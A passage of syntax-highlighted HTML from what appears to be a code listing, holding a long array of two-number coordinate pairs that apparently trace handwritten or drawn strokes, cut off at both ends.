class="number">28</span>, <span class="number">14</span>], [<span class="number">27</span>, <span class="number">14</span>], [<span class="number">26</span>, <span class="number">14</span>],</span><br><span class="line">               [<span class="number">25</span>, <span class="number">14</span>], [<span class="number">24</span>, <span class="number">14</span>], [<span class="number">23</span>, <span class="number">14</span>], [<span class="number">22</span>, <span class="number">14</span>], [<span class="number">21</span>, <span class="number">15</span>], [<span class="number">20</span>, <span class="number">16</span>], [<span class="number">19</span>, <span class="number">17</span>], [<span class="number">18</span>, <span class="number">19</span>], [<span class="number">18</span>, <span class="number">21</span>], [<span class="number">18</span>, <span class="number">22</span>],</span><br><span class="line">               [<span class="number">18</span>, <span class="number">23</span>], [<span class="number">18</span>, <span class="number">24</span>], [<span class="number">18</span>, <span class="number">26</span>], [<span class="number">18</span>, <span class="number">27</span>], [<span class="number">18</span>, <span class="number">28</span>], [<span class="number">18</span>, <span class="number">30</span>], [<span class="number">18</span>, <span class="number">32</span>], [<span class="number">18</span>, <span class="number">33</span>], [<span class="number">18</span>, <span class="number">34</span>], [<span class="number">19</span>, <span class="number">37</span>],</span><br><span class="line">               [<span class="number">21</span>, <span class="number">39</span>], [<span class="number">21</span>, <span class="number">40</span>], [<span class="number">22</span>, <span class="number">42</span>], [<span class="number">24</span>, <span class="number">44</span>], [<span class="number">24</span>, <span class="number">45</span>], [<span class="number">26</span>, <span class="number">47</span>], [<span class="number">27</span>, <span class="number">48</span>], [<span class="number">28</span>, <span class="number">49</span>], [<span class="number">29</span>, <span class="number">50</span>], [<span class="number">30</span>, <span class="number">51</span>],</span><br><span class="line">               [<span class="number">31</span>, <span class="number">52</span>], [<span class="number">33</span>, <span class="number">53</span>], [<span class="number">34</span>, <span class="number">53</span>], [<span class="number">35</span>, <span class="number">54</span>], [<span class="number">36</span>, <span class="number">54</span>], [<span class="number">37</span>, <span class="number">54</span>], [<span class="number">38</span>, <span class="number">54</span>], [<span class="number">39</span>, <span class="number">54</span>], [<span class="number">40</span>, <span class="number">54</span>], [<span class="number">41</span>, <span class="number">54</span>],</span><br><span class="line">               [<span class="number">44</span>, <span class="number">54</span>], [<span class="number">46</span>, <span class="number">54</span>], [<span class="number">48</span>, <span class="number">54</span>], [<span class="number">50</span>, <span class="number">54</span>], [<span class="number">52</span>, <span class="number">53</span>], [<span class="number">53</span>, <span class="number">53</span>], [<span class="number">54</span>, <span class="number">52</span>], [<span class="number">55</span>, <span class="number">52</span>], [<span class="number">56</span>, <span class="number">52</span>], [<span class="number">58</span>, <span class="number">51</span>],</span><br><span class="line">               [<span class="number">59</span>, <span class="number">50</span>], [<span class="number">61</span>, <span class="number">49</span>], [<span class="number">62</span>, <span class="number">49</span>], [<span class="number">64</span>, <span class="number">47</span>], [<span class="number">65</span>, <span class="number">47</span>], [<span class="number">67</span>, <span class="number">46</span>], [<span class="number">68</span>, <span class="number">46</span>], [<span class="number">70</span>, <span class="number">45</span>], [<span class="number">71</span>, <span class="number">44</span>], [<span class="number">125</span>, <span class="number">23</span>],</span><br><span class="line">               [<span class="number">125</span>, <span class="number">23</span>], [<span class="number">124</span>, <span class="number">22</span>], [<span class="number">123</span>, <span class="number">22</span>], [<span class="number">121</span>, <span class="number">21</span>], [<span class="number">118</span>, <span class="number">20</span>], [<span class="number">115</span>, <span class="number">19</span>], [<span class="number">113</span>, <span class="number">19</span>], [<span class="number">112</span>, <span class="number">18</span>], [<span class="number">111</span>, <span class="number">18</span>],</span><br><span class="line">               [<span class="number">109</span>, <span class="number">17</span>], [<span class="number">106</span>, <span class="number">16</span>], [<span class="number">104</span>, <span class="number">16</span>], [<span class="number">103</span>, <span class="number">16</span>], [<span class="number">102</span>, <span class="number">15</span>], [<span class="number">101</span>, <span class="number">15</span>], [<span class="number">100</span>, <span class="number">15</span>], [<span class="number">99</span>, <span class="number">15</span>], [<span class="number">98</span>, <span class="number">15</span>],</span><br><span class="line">               [<span class="number">97</span>, <span class="number">15</span>], [<span class="number">96</span>, <span class="number">15</span>], [<span class="number">95</span>, <span class="number">15</span>], [<span class="number">94</span>, <span class="number">15</span>], [<span class="number">93</span>, <span class="number">15</span>], [<span class="number">92</span>, <span class="number">15</span>], [<span class="number">91</span>, <span class="number">15</span>], [<span class="number">89</span>, <span class="number">15</span>], [<span class="number">87</span>, <span class="number">17</span>], [<span class="number">85</span>, <span class="number">18</span>],</span><br><span class="line">               [<span class="number">85</span>, <span class="number">19</span>], [<span class="number">84</span>, <span class="number">21</span>], [<span class="number">83</span>, <span class="number">21</span>], [<span class="number">82</span>, <span class="number">22</span>], [<span class="number">82</span>, <span class="number">23</span>], [<span class="number">81</span>, <span class="number">24</span>], [<span class="number">81</span>, <span class="number">26</span>], [<span class="number">80</span>, <span class="number">28</span>], [<span class="number">80</span>, <span class="number">29</span>], [<span class="number">80</span>, <span class="number">31</span>],</span><br><span class="line">               [<span class="number">80</span>, <span class="number">32</span>], [<span class="number">79</span>, <span class="number">34</span>], [<span class="number">79</span>, <span class="number">35</span>], [<span class="number">79</span>, <span class="number">37</span>], [<span class="number">79</span>, <span class="number">39</span>], [<span class="number">79</span>, <span class="number">41</span>], [<span class="number">79</span>, <span class="number">43</span>], [<span class="number">79</span>, <span class="number">44</span>], [<span class="number">79</span>, <span class="number">46</span>], [<span class="number">79</span>, <span class="number">47</span>],</span><br><span class="line">               [<span class="number">80</span>, <span class="number">48</span>], [<span class="number">81</span>, <span class="number">49</span>], [<span class="number">82</span>, <span class="number">50</span>], [<span class="number">84</span>, <span class="number">50</span>], [<span class="number">87</span>, <span class="number">51</span>], [<span class="number">88</span>, <span class="number">51</span>], [<span class="number">90</span>, <span class="number">51</span>], [<span class="number">91</span>, <span class="number">51</span>], [<span class="number">93</span>, <span class="number">51</span>], [<span class="number">94</span>, <span class="number">51</span>],</span><br><span class="line">               [<span class="number">97</span>, <span class="number">51</span>], [<span class="number">100</span>, <span class="number">50</span>], [<span class="number">101</span>, <span class="number">49</span>], [<span class="number">102</span>, <span class="number">49</span>], [<span class="number">103</span>, <span class="number">48</span>], [<span class="number">105</span>, <span class="number">46</span>], [<span class="number">106</span>, <span class="number">45</span>], [<span class="number">108</span>, <span class="number">43</span>], [<span class="number">109</span>, <span class="number">42</span>],</span><br><span class="line">               [<span class="number">110</span>, <span class="number">41</span>], [<span class="number">111</span>, <span class="number">39</span>], [<span class="number">112</span>, <span class="number">38</span>], [<span class="number">112</span>, <span class="number">36</span>], [<span class="number">113</span>, <span class="number">34</span>], [<span class="number">114</span>, <span class="number">33</span>], [<span class="number">115</span>, <span class="number">32</span>], [<span class="number">115</span>, <span class="number">31</span>], [<span class="number">116</span>, <span class="number">30</span>],</span><br><span class="line">               [<span class="number">117</span>, <span class="number">28</span>], [<span class="number">118</span>, <span class="number">27</span>], [<span class="number">118</span>, <span class="number">28</span>], [<span class="number">117</span>, <span class="number">30</span>], [<span class="number">116</span>, <span class="number">32</span>], [<span class="number">115</span>, <span class="number">34</span>], [<span class="number">115</span>, <span class="number">36</span>], [<span class="number">114</span>, <span class="number">39</span>], [<span class="number">114</span>, <span class="number">41</span>],</span><br><span class="line">               [<span class="number">114</span>, <span class="number">43</span>], [<span class="number">114</span>, <span class="number">45</span>], [<span class="number">114</span>, <span class="number">47</span>], [<span class="number">114</span>, <span class="number">48</span>], [<span class="number">114</span>, <span class="number">50</span>], [<span class="number">114</span>, <span class="number">52</span>], [<span class="number">114</span>, <span class="number">53</span>], [<span class="number">115</span>, <span class="number">54</span>], [<span class="number">116</span>, <span class="number">55</span>],</span><br><span class="line">               [<span class="number">117</span>, <span class="number">56</span>], [<span class="number">118</span>, <span class="number">57</span>], [<span class="number">120</span>, <span class="number">57</span>], [<span class="number">122</span>, <span class="number">57</span>], [<span class="number">124</span>, <span class="number">57</span>], [<span class="number">126</span>, <span class="number">57</span>], [<span class="number">128</span>, <span class="number">57</span>], [<span class="number">131</span>, <span class="number">57</span>], [<span class="number">133</span>, <span class="number">57</span>],</span><br><span class="line">               [<span class="number">136</span>, <span class="number">57</span>], [<span class="number">138</span>, <span class="number">57</span>], [<span class="number">141</span>, <span class="number">57</span>], [<span class="number">143</span>, <span class="number">56</span>], [<span class="number">145</span>, <span class="number">55</span>], [<span class="number">147</span>, <span class="number">53</span>], [<span class="number">149</span>, <span class="number">52</span>], [<span class="number">150</span>, <span class="number">52</span>], [<span class="number">152</span>, <span class="number">50</span>],</span><br><span class="line">               [<span class="number">153</span>, <span class="number">49</span>], [<span class="number">155</span>, <span class="number">47</span>], [<span class="number">156</span>, <span class="number">46</span>], [<span class="number">157</span>, <span class="number">45</span>], [<span class="number">212</span>, <span class="number">24</span>], [<span class="number">212</span>, <span class="number">24</span>], [<span class="number">213</span>, <span class="number">23</span>], [<span class="number">211</span>, <span class="number">21</span>], [<span class="number">210</span>, <span class="number">20</span>],</span><br><span class="line">               [<span class="number">209</span>, <span class="number">19</span>], [<span class="number">208</span>, <span class="number">18</span>], [<span class="number">207</span>, <span class="number">17</span>], [<span class="number">206</span>, <span class="number">16</span>], [<span class="number">205</span>, <span class="number">15</span>], [<span class="number">204</span>, <span class="number">15</span>], [<span class="number">201</span>, <span class="number">14</span>], [<span class="number">200</span>, <span class="number">14</span>], [<span class="number">199</span>, <span class="number">14</span>],</span><br><span class="line">               [<span class="number">197</span>, <span class="number">14</span>], [<span class="number">196</span>, <span class="number">14</span>], [<span class="number">195</span>, <span class="number">14</span>], [<span class="number">193</span>, <span class="number">14</span>], [<span class="number">191</span>, <span class="number">14</span>], [<span class="number">189</span>, <span class="number">16</span>], [<span class="number">188</span>, <span class="number">16</span>], [<span class="number">187</span>, <span class="number">16</span>], [<span class="number">186</span>, <span class="number">17</span>],</span><br><span class="line">               [<span class="number">185</span>, <span class="number">17</span>], [<span class="number">183</span>, <span class="number">18</span>], [<span class="number">183</span>, <span class="number">20</span>], [<span class="number">183</span>, <span class="number">21</span>], [<span class="number">182</span>, <span class="number">22</span>], [<span class="number">182</span>, <span class="number">23</span>], [<span class="number">182</span>, <span class="number">24</span>], [<span class="number">182</span>, <span class="number">25</span>], [<span class="number">182</span>, <span class="number">26</span>],</span><br><span class="line">               [<span class="number">182</span>, <span class="number">27</span>], [<span class="number">182</span>, <span class="number">29</span>], [<span class="number">183</span>, <span class="number">31</span>], [<span class="number">184</span>, <span class="number">32</span>], [<span class="number">186</span>, <span class="number">33</span>], [<span class="number">187</span>, <span class="number">34</span>], [<span class="number">188</span>, <span class="number">34</span>], [<span class="number">189</span>, <span class="number">35</span>], [<span class="number">190</span>, <span class="number">35</span>],</span><br><span class="line">               [<span class="number">192</span>, <span class="number">36</span>], [<span class="number">194</span>, <span class="number">37</span>], [<span class="number">196</span>, <span class="number">37</span>], [<span class="number">198</span>, <span class="number">38</span>], [<span class="number">199</span>, <span class="number">38</span>], [<span class="number">200</span>, <span class="number">38</span>], [<span class="number">201</span>, <span class="number">38</span>], [<span class="number">202</span>, <span class="number">39</span>], [<span class="number">203</span>, <span class="number">39</span>],</span><br><span class="line">               [<span class="number">204</span>, <span class="number">40</span>], [<span class="number">207</span>, <span class="number">41</span>], [<span class="number">207</span>, <span class="number">42</span>], [<span class="number">208</span>, <span class="number">43</span>], [<span class="number">208</span>, <span class="number">44</span>], [<span class="number">208</span>, <span class="number">45</span>], [<span class="number">208</span>, <span class="number">46</span>], [<span class="number">208</span>, <span class="number">48</span>], [<span class="number">208</span>, <span class="number">50</span>],</span><br><span class="line">               [<span class="number">208</span>, <span class="number">51</span>], [<span class="number">207</span>, <span class="number">53</span>], [<span class="number">207</span>, <span class="number">54</span>], [<span class="number">206</span>, <span class="number">56</span>], [<span class="number">204</span>, <span class="number">58</span>], [<span class="number">203</span>, <span class="number">60</span>], [<span class="number">202</span>, <span class="number">61</span>], [<span class="number">201</span>, <span class="number">62</span>], [<span class="number">201</span>, <span class="number">63</span>],</span><br><span class="line">               [<span class="number">200</span>, <span class="number">64</span>], [<span class="number">199</span>, <span class="number">64</span>], [<span class="number">198</span>, <span class="number">64</span>], [<span class="number">197</span>, <span class="number">65</span>], [<span class="number">196</span>, <span class="number">65</span>], [<span class="number">195</span>, <span class="number">65</span>], [<span class="number">193</span>, <span class="number">65</span>], [<span class="number">192</span>, <span class="number">65</span>], [<span class="number">190</span>, <span class="number">65</span>],</span><br><span class="line">               [<span class="number">189</span>, <span class="number">65</span>], [<span class="number">187</span>, <span class="number">65</span>], [<span class="number">185</span>, <span class="number">65</span>], [<span class="number">184</span>, <span class="number">65</span>], [<span class="number">183</span>, <span class="number">65</span>], [<span class="number">181</span>, <span class="number">64</span>], [<span class="number">180</span>, <span class="number">63</span>], [<span class="number">179</span>, <span class="number">63</span>], [<span class="number">178</span>, <span class="number">62</span>],</span><br><span class="line">               [<span class="number">177</span>, <span class="number">62</span>], [<span class="number">175</span>, <span class="number">61</span>], [<span class="number">174</span>, <span class="number">60</span>], [<span class="number">173</span>, <span class="number">59</span>], [<span class="number">243</span>, <span class="number">20</span>], [<span class="number">243</span>, <span class="number">20</span>], [<span class="number">244</span>, <span class="number">19</span>], [<span class="number">244</span>, <span class="number">21</span>], [<span class="number">244</span>, <span class="number">25</span>],</span><br><span class="line">               [<span class="number">245</span>, <span class="number">26</span>], [<span class="number">245</span>, <span class="number">29</span>], [<span class="number">247</span>, <span class="number">32</span>], [<span class="number">247</span>, <span class="number">34</span>], [<span class="number">248</span>, <span class="number">36</span>], [<span class="number">248</span>, <span class="number">37</span>], [<span class="number">249</span>, <span class="number">39</span>], [<span class="number">250</span>, <span class="number">40</span>], [<span class="number">251</span>, <span class="number">42</span>],</span><br><span class="line">               [<span class="number">251</span>, <span class="number">43</span>], [<span class="number">252</span>, <span class="number">44</span>], [<span class="number">254</span>, <span class="number">44</span>], [<span class="number">256</span>, <span class="number">44</span>], [<span class="number">258</span>, <span class="number">44</span>], [<span class="number">260</span>, <span class="number">42</span>], [<span class="number">262</span>, <span class="number">41</span>], [<span class="number">263</span>, <span class="number">40</span>], [<span class="number">265</span>, <span class="number">38</span>],</span><br><span class="line">               [<span class="number">266</span>, <span class="number">35</span>], [<span class="number">267</span>, <span class="number">32</span>], [<span class="number">268</span>, <span class="number">30</span>], [<span class="number">271</span>, <span class="number">27</span>], [<span class="number">272</span>, <span class="number">25</span>], [<span class="number">273</span>, <span class="number">22</span>], [<span class="number">274</span>, <span class="number">21</span>], [<span class="number">275</span>, <span class="number">20</span>], [<span class="number">275</span>, <span class="number">19</span>],</span><br><span class="line">               [<span class="number">274</span>, <span class="number">18</span>], [<span class="number">274</span>, <span class="number">20</span>], [<span class="number">272</span>, <span class="number">22</span>], [<span class="number">271</span>, <span class="number">23</span>], [<span class="number">271</span>, <span class="number">26</span>], [<span class="number">268</span>, <span class="number">29</span>], [<span class="number">266</span>, <span class="number">33</span>], [<span class="number">266</span>, <span class="number">35</span>], [<span class="number">265</span>, <span class="number">37</span>],</span><br><span class="line">               [<span class="number">263</span>, <span class="number">40</span>], [<span class="number">262</span>, <span class="number">42</span>], [<span class="number">262</span>, <span class="number">44</span>], [<span class="number">261</span>, <span class="number">47</span>], [<span class="number">260</span>, <span class="number">49</span>], [<span class="number">259</span>, <span class="number">51</span>], [<span class="number">258</span>, <span class="number">55</span>], [<span class="number">258</span>, <span class="number">56</span>], [<span class="number">257</span>, <span class="number">58</span>],</span><br><span class="line">               [<span class="number">255</span>, <span class="number">61</span>], [<span class="number">254</span>, <span class="number">62</span>], [<span class="number">253</span>, <span class="number">63</span>], [<span class="number">253</span>, <span class="number">64</span>], [<span class="number">252</span>, <span class="number">65</span>], [<span class="number">251</span>, <span class="number">66</span>], [<span class="number">250</span>, <span class="number">67</span>], [<span class="number">249</span>, <span class="number">68</span>], [<span class="number">248</span>, <span class="number">69</span>],</span><br><span class="line">               [<span class="number">247</span>, <span class="number">70</span>], [<span class="number">246</span>, <span class="number">71</span>], [<span class="number">245</span>, <span class="number">72</span>], [<span class="number">244</span>, <span class="number">73</span>], [<span class="number">298</span>, <span class="number">64</span>], [<span class="number">298</span>, <span class="number">64</span>], [<span class="number">299</span>, <span class="number">65</span>], [<span class="number">300</span>, <span class="number">65</span>], [<span class="number">302</span>, <span class="number">65</span>],</span><br><span class="line">               [<span class="number">304</span>, <span class="number">65</span>], [<span class="number">306</span>, <span class="number">65</span>], [<span class="number">308</span>, <span class="number">65</span>], [<span class="number">309</span>, <span class="number">65</span>], [<span class="number">312</span>, <span class="number">65</span>], [<span class="number">315</span>, <span class="number">65</span>], [<span class="number">317</span>, <span class="number">65</span>], [<span class="number">319</span>, <span class="number">65</span>], [<span class="number">322</span>, <span class="number">65</span>],</span><br><span class="line">               [<span class="number">325</span>, <span class="number">65</span>], [<span class="number">327</span>, <span class="number">65</span>], [<span class="number">330</span>, <span class="number">65</span>], [<span class="number">332</span>, <span class="number">65</span>], [<span class="number">334</span>, <span class="number">66</span>], [<span class="number">335</span>, <span class="number">66</span>], [<span class="number">20</span>, <span class="number">103</span>], [<span class="number">20</span>, <span class="number">104</span>], [<span class="number">20</span>, <span class="number">107</span>],</span><br><span class="line">               [<span class="number">20</span>, <span class="number">110</span>], [<span class="number">20</span>, <span class="number">112</span>], [<span class="number">20</span>, <span class="number">114</span>], [<span class="number">20</span>, <span class="number">118</span>], [<span class="number">19</span>, <span class="number">121</span>], [<span class="number">18</span>, <span class="number">124</span>], [<span class="number">17</span>, <span class="number">126</span>], [<span class="number">17</span>, <span class="number">130</span>], [<span class="number">17</span>, <span class="number">134</span>],</span><br><span class="line">               [<span class="number">17</span>, <span class="number">137</span>], [<span class="number">17</span>, <span class="number">139</span>], [<span class="number">17</span>, <span class="number">142</span>], [<span class="number">17</span>, <span class="number">143</span>], [<span class="number">17</span>, <span class="number">146</span>], [<span class="number">17</span>, <span class="number">147</span>], [<span class="number">17</span>, <span class="number">149</span>], [<span class="number">17</span>, <span class="number">150</span>], [<span class="number">17</span>, <span class="number">149</span>],</span><br><span class="line">               [<span class="number">17</span>, <span class="number">148</span>], [<span class="number">17</span>, <span class="number">146</span>], [<span class="number">18</span>, <span class="number">145</span>], [<span class="number">18</span>, <span class="number">143</span>], [<span class="number">19</span>, <span class="number">142</span>], [<span class="number">20</span>, <span class="number">141</span>], [<span class="number">20</span>, <span class="number">140</span>], [<span class="number">21</span>, <span class="number">138</span>], [<span class="number">21</span>, <span class="number">137</span>],</span><br><span class="line">               [<span class="number">22</span>, <span class="number">135</span>], [<span class="number">23</span>, <span class="number">134</span>], [<span class="number">24</span>, <span class="number">132</span>], [<span class="number">25</span>, <span class="number">131</span>], [<span class="number">26</span>, <span class="number">129</span>], [<span class="number">27</span>, <span class="number">128</span>], [<span class="number">28</span>, <span class="number">127</span>], [<span class="number">29</span>, <span class="number">126</span>], [<span class="number">31</span>, <span class="number">125</span>],</span><br><span class="line">               [<span class="number">32</span>, <span class="number">124</span>], [<span class="number">32</span>, <span class="number">123</span>], [<span class="number">34</span>, <span class="number">121</span>], [<span class="number">35</span>, <span class="number">120</span>], [<span class="number">37</span>, <span class="number">120</span>], [<span class="number">38</span>, <span class="number">119</span>], [<span class="number">40</span>, <span class="number">118</span>], [<span class="number">41</span>, <span class="number">118</span>], [<span class="number">43</span>, <span class="number">117</span>],</span><br><span class="line">               [<span class="number">44</span>, <span class="number">116</span>], [<span class="number">46</span>, <span class="number">115</span>], [<span class="number">48</span>, <span class="number">115</span>], [<span class="number">49</span>, <span class="number">114</span>], [<span class="number">50</span>, <span class="number">113</span>], [<span class="number">51</span>, <span class="number">113</span>], [<span class="number">52</span>, <span class="number">112</span>], [<span class="number">80</span>, <span class="number">121</span>], [<span class="number">80</span>, <span class="number">121</span>],</span><br><span class="line">               [<span class="number">79</span>, <span class="number">120</span>], [<span class="number">78</span>, <span class="number">121</span>], [<span class="number">77</span>, <span class="number">122</span>], [<span class="number">77</span>, <span class="number">123</span>], [<span class="number">77</span>, <span class="number">124</span>], [<span class="number">76</span>, <span class="number">127</span>], [<span class="number">75</span>, <span class="number">128</span>], [<span class="number">74</span>, <span class="number">129</span>], [<span class="number">73</span>, <span class="number">131</span>],</span><br><span class="line">               [<span class="number">73</span>, <span class="number">132</span>], [<span class="number">73</span>, <span class="number">133</span>], [<span class="number">72</span>, <span class="number">135</span>], [<span class="number">72</span>, <span class="number">136</span>], [<span class="number">72</span>, <span class="number">137</span>], [<span class="number">72</span>, <span class="number">138</span>], [<span class="number">72</span>, <span class="number">139</span>], [<span class="number">72</span>, <span class="number">140</span>], [<span class="number">72</span>, <span class="number">142</span>],</span><br><span class="line">               [<span class="number">72</span>, <span class="number">144</span>], [<span class="number">72</span>, <span class="number">145</span>], [<span class="number">73</span>, <span class="number">148</span>], [<span class="number">74</span>, <span class="number">149</span>], [<span class="number">77</span>, <span class="number">150</span>], [<span class="number">78</span>, <span class="number">150</span>], [<span class="number">80</span>, <span class="number">151</span>], [<span class="number">81</span>, <span class="number">151</span>], [<span class="number">82</span>, <span class="number">151</span>],</span><br><span class="line">               [<span class="number">83</span>, <span class="number">151</span>], [<span class="number">84</span>, <span class="number">151</span>], [<span class="number">85</span>, <span class="number">151</span>], [<span class="number">87</span>, <span class="number">151</span>], [<span class="number">89</span>, <span class="number">151</span>], [<span class="number">90</span>, <span class="number">151</span>], [<span class="number">92</span>, <span class="number">150</span>], [<span class="number">93</span>, <span class="number">150</span>], [<span class="number">95</span>, <span class="number">149</span>],</span><br><span class="line">               [<span class="number">97</span>, <span class="number">147</span>], [<span class="number">98</span>, <span class="number">146</span>], [<span class="number">99</span>, <span class="number">146</span>], [<span class="number">100</span>, <span class="number">145</span>], [<span class="number">101</span>, <span class="number">144</span>], [<span class="number">102</span>, <span class="number">142</span>], [<span class="number">102</span>, <span class="number">141</span>], [<span class="number">104</span>, <span class="number">139</span>], [<span class="number">104</span>, <span class="number">138</span>],</span><br><span class="line">               [<span class="number">105</span>, <span class="number">136</span>], [<span class="number">105</span>, <span class="number">135</span>], [<span class="number">105</span>, <span class="number">133</span>], [<span class="number">105</span>, <span class="number">132</span>], [<span class="number">105</span>, <span class="number">131</span>], [<span class="number">105</span>, <span class="number">129</span>], [<span class="number">104</span>, <span class="number">128</span>], [<span class="number">103</span>, <span class="number">126</span>],</span><br><span class="line">               [<span class="number">102</span>, <span class="number">126</span>], [<span class="number">101</span>, <span class="number">125</span>], [<span class="number">98</span>, <span class="number">123</span>], [<span class="number">96</span>, <span class="number">123</span>], [<span class="number">95</span>, <span class="number">123</span>], [<span class="number">93</span>, <span class="number">123</span>], [<span class="number">92</span>, <span class="number">122</span>], [<span class="number">90</span>, <span class="number">121</span>], [<span class="number">89</span>, <span class="number">121</span>],</span><br><span class="line">               [<span class="number">86</span>, <span class="number">120</span>], [<span class="number">147</span>, <span class="number">98</span>], [<span class="number">147</span>, <span class="number">98</span>], [<span class="number">146</span>, <span class="number">99</span>], [<span class="number">145</span>, <span class="number">100</span>], [<span class="number">144</span>, <span class="number">103</span>], [<span class="number">143</span>, <span class="number">104</span>], [<span class="number">142</span>, <span class="number">105</span>], [<span class="number">142</span>, <span class="number">106</span>],</span><br><span class="line">               [<span class="number">142</span>, <span class="number">109</span>], [<span class="number">142</span>, <span class="number">111</span>], [<span class="number">142</span>, <span class="number">114</span>], [<span class="number">141</span>, <span class="number">118</span>], [<span class="number">140</span>, <span class="number">120</span>], [<span class="number">139</span>, <span class="number">123</span>], [<span class="number">138</span>, <span class="number">127</span>], [<span class="number">138</span>, <span class="number">129</span>],</span><br><span class="line">               [<span class="number">137</span>, <span class="number">133</span>], [<span class="number">135</span>, <span class="number">135</span>], [<span class="number">134</span>, <span class="number">137</span>], [<span class="number">133</span>, <span class="number">139</span>], [<span class="number">131</span>, <span class="number">142</span>], [<span class="number">131</span>, <span class="number">143</span>], [<span class="number">131</span>, <span class="number">145</span>], [<span class="number">130</span>, <span class="number">146</span>],</span><br><span class="line">               [<span class="number">129</span>, <span class="number">149</span>], [<span class="number">128</span>, <span class="number">152</span>], [<span class="number">128</span>, <span class="number">153</span>], [<span class="number">127</span>, <span class="number">156</span>], [<span class="number">127</span>, <span class="number">157</span>], [<span class="number">126</span>, <span class="number">158</span>], [<span class="number">127</span>, <span class="number">157</span>], [<span class="number">129</span>, <span class="number">157</span>],</span><br><span class="line">               [<span class="number">130</span>, <span class="number">156</span>], [<span class="number">132</span>, <span class="number">156</span>], [<span class="number">134</span>, <span class="number">155</span>], [<span class="number">137</span>, <span class="number">153</span>], [<span class="number">138</span>, <span class="number">152</span>], [<span class="number">139</span>, <span class="number">151</span>], [<span class="number">140</span>, <span class="number">150</span>], [<span class="number">143</span>, <span class="number">149</span>],</span><br><span class="line">               [<span class="number">144</span>, <span class="number">148</span>], [<span class="number">145</span>, <span class="number">147</span>], [<span class="number">146</span>, <span class="number">146</span>], [<span class="number">147</span>, <span class="number">145</span>], [<span class="number">149</span>, <span class="number">144</span>], [<span class="number">149</span>, <span class="number">143</span>], [<span class="number">150</span>, <span class="number">142</span>], [<span class="number">151</span>, <span class="number">141</span>],</span><br><span class="line">               [<span class="number">152</span>, <span class="number">140</span>], [<span class="number">152</span>, <span class="number">139</span>], [<span class="number">153</span>, <span class="number">138</span>], [<span class="number">153</span>, <span class="number">137</span>], [<span class="number">153</span>, <span class="number">136</span>], [<span class="number">153</span>, <span class="number">135</span>], [<span class="number">153</span>, <span class="number">134</span>], [<span class="number">153</span>, <span class="number">133</span>],</span><br><span class="line">               [<span class="number">152</span>, <span class="number">132</span>], [<span class="number">151</span>, <span class="number">131</span>], [<span class="number">150</span>, <span class="number">131</span>], [<span class="number">149</span>, <span class="number">130</span>], [<span class="number">147</span>, <span class="number">129</span>], [<span class="number">186</span>, <span class="number">136</span>], [<span class="number">186</span>, <span class="number">136</span>], [<span class="number">183</span>, <span class="number">137</span>],</span><br><span class="line">               [<span class="number">182</span>, <span class="number">138</span>], [<span class="number">182</span>, <span class="number">139</span>], [<span class="number">182</span>, <span class="number">140</span>], [<span class="number">181</span>, <span class="number">142</span>], [<span class="number">179</span>, <span class="number">144</span>], [<span class="number">179</span>, <span class="number">145</span>], [<span class="number">179</span>, <span class="number">147</span>], [<span class="number">178</span>, <span class="number">149</span>],</span><br><span class="line">               [<span class="number">177</span>, <span class="number">150</span>], [<span class="number">177</span>, <span class="number">151</span>], [<span class="number">177</span>, <span class="number">152</span>], [<span class="number">177</span>, <span class="number">154</span>], [<span class="number">177</span>, <span class="number">156</span>], [<span class="number">177</span>, <span class="number">157</span>], [<span class="number">177</span>, <span class="number">158</span>], [<span class="number">178</span>, <span class="number">160</span>],</span><br><span class="line">               [<span class="number">179</span>, <span class="number">161</span>], [<span class="number">180</span>, <span class="number">162</span>], [<span class="number">181</span>, <span class="number">163</span>], [<span class="number">182</span>, <span class="number">164</span>], [<span class="number">184</span>, <span class="number">164</span>], [<span class="number">186</span>, <span class="number">164</span>], [<span class="number">187</span>, <span class="number">164</span>], [<span class="number">188</span>, <span class="number">164</span>],</span><br><span class="line">               [<span class="number">190</span>, <span class="number">163</span>], [<span class="number">191</span>, <span class="number">162</span>], [<span class="number">192</span>, <span class="number">162</span>], [<span class="number">194</span>, <span class="number">160</span>], [<span class="number">196</span>, <span class="number">159</span>], [<span class="number">197</span>, <span class="number">158</span>], [<span class="number">197</span>, <span class="number">156</span>], [<span class="number">198</span>, <span class="number">155</span>],</span><br><span class="line">               [<span class="number">200</span>, <span class="number">153</span>], [<span class="number">200</span>, <span class="number">152</span>], [<span class="number">201</span>, <span class="number">150</span>], [<span class="number">201</span>, <span class="number">149</span>], [<span class="number">201</span>, <span class="number">148</span>], [<span class="number">201</span>, <span class="number">147</span>], [<span class="number">201</span>, <span class="number">145</span>], [<span class="number">201</span>, <span class="number">144</span>],</span><br><span class="line">               [<span class="number">201</span>, <span class="number">142</span>], [<span class="number">201</span>, <span class="number">141</span>], [<span class="number">201</span>, <span class="number">139</span>], [<span class="number">201</span>, <span class="number">138</span>], [<span class="number">200</span>, <span class="number">136</span>], [<span class="number">199</span>, <span class="number">135</span>], [<span class="number">198</span>, <span class="number">135</span>], [<span class="number">197</span>, <span class="number">135</span>],</span><br><span class="line">               [<span class="number">196</span>, <span class="number">135</span>], [<span class="number">195</span>, <span class="number">135</span>], [<span class="number">193</span>, <span class="number">135</span>], [<span class="number">192</span>, <span class="number">135</span>], [<span class="number">190</span>, <span class="number">135</span>], [<span class="number">189</span>, <span class="number">135</span>], [<span class="number">223</span>, <span class="number">167</span>], [<span class="number">223</span>, <span class="number">167</span>],</span><br><span class="line">               [<span class="number">224</span>, <span class="number">167</span>], [<span class="number">226</span>, <span class="number">167</span>], [<span class="number">228</span>, <span class="number">167</span>], [<span class="number">229</span>, <span class="number">167</span>], [<span class="number">232</span>, <span class="number">167</span>], [<span class="number">233</span>, <span class="number">167</span>], [<span class="number">234</span>, <span class="number">167</span>], [<span class="number">235</span>, <span class="number">167</span>],</span><br><span class="line">               [<span class="number">237</span>, <span class="number">167</span>], [<span class="number">238</span>, <span class="number">167</span>], [<span class="number">240</span>, <span class="number">167</span>], [<span class="number">241</span>, <span class="number">167</span>], [<span class="number">243</span>, <span class="number">167</span>], [<span class="number">244</span>, <span class="number">167</span>], [<span class="number">246</span>, <span class="number">167</span>], [<span class="number">247</span>, <span class="number">167</span>],</span><br><span class="line">               [<span class="number">250</span>, <span class="number">168</span>], [<span class="number">251</span>, <span class="number">168</span>], [<span class="number">252</span>, <span class="number">168</span>], [<span class="number">253</span>, <span class="number">168</span>], [<span class="number">254</span>, <span class="number">168</span>], [<span class="number">269</span>, <span class="number">135</span>], [<span class="number">271</span>, <span class="number">136</span>], [<span class="number">273</span>, <span class="number">138</span>],</span><br><span class="line">               [<span class="number">275</span>, <span class="number">140</span>], [<span class="number">276</span>, <span class="number">141</span>], [<span class="number">278</span>, <span 